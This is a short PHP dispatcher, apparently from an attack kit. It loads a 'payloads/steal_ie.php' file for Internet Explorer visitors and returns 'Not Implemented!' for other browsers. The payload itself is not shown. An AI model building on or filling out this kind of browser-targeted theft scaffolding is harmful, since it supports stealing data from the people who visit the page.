<?php
switch($browser)
{
  case "IE":
    require("payloads/steal_ie.php");  
    break;
  case "Firefox":
    $result = "Not Implemented!";
    break;
  case "Opera":
    $result = "Not Implemented!";
    break;
  case "Chrome":
    $result = "Not Implemented!";
    break;
  default:
    $result = "Nice try ;)";
    break;
}
?>
